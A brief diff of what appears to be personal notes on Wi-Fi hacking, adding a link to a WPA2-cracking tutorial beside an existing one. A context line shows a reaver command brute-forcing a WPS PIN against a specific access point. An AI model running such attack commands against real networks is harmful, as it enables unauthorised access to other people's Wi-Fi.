@@ -33,3 +33,4 @@ reaver -i wlan0mon -c 6 -b 64:66:B3:70:9F:C8 -p 19018324  -vv --ignore-locks
 
 ## Good links
 http://null-byte.wonderhowto.com/how-to/hack-wpa-wifi-passwords-by-cracking-wps-pin-0132542/
+http://www.wirelessdomination.com/how-to-crack-wpa2-wifi-password-using-reaver-wpa2/
